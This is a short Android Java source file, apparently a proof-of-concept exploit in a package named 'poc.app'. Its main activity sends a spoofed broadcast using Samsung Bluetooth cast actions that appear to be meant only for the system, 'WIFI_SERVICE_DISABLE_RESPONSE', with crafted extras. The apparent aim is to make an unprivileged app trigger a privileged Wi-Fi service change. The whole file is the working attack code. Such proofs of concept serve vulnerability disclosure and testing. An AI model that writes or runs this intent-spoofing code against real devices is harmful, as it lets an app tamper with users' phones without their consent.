package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent("com.samsung.android.bluetooth.mcf.cast.action.WIFI_SERVICE_DISABLE_RESPONSE");
        i.putExtra("com.samsung.android.bluetooth.mcf.cast.extra.WIFI_SERVICE_DISABLE_RESPONSE", 1);
        i.putExtra("com.samsung.android.bluetooth.mcf.cast.extra.WIFI_SERVICE_NAME", 4);
        sendBroadcast(i);
    }
}